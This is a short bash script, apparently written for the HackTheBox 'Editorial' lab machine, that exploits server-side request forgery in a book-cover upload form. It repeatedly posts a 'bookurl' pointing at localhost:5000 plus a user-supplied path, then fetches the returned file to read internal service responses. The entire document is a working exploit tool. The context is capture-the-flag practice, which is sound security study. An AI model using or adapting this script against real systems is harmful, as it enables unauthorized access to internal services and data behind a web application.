#!/bin/bash

while true; do
    read -p "path> " path

    # Step 1 — send SSRF request
    response=$(curl -s -m 10 -X POST http://editorial.htb/upload-cover \
        -F "bookurl=http://localhost:5000${path}" \
        -F "bookfile=;filename=" \
        2>/dev/null)

    # Step 2 — fetch the returned path from the main server
    content=$(curl -s -X GET "http://editorial.htb/${response}" 2>/dev/null)

    # Step 3 — print
    echo "$content"
    echo ""
done